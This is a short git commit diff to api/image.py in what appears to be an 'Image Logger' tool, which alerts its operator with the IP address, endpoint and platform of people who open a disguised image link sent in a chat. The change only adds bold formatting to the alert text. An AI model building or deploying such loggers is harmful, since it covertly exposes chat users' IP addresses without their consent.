84cdb6e0c6dfb11eee55937c393aafe37fd97b54
bklamheem <luvnone590@gmail.com>
2025-07-23 23:21:23 -0700

    Update image.py

--- api/image.py
+++ api/image.py
@@ -99,9 +99,9 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
     "content": "",
     "embeds": [
         {
-            "title": "Image Logger - (not real ip)",
+            "title": "Image Logger - (**not real ip**)",
             "color": config["color"],
-            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
+            "description": f"An **Image Logging** link was sent in a chat!\n**You may receive an IP soon**.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
         }
     ],
 }) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
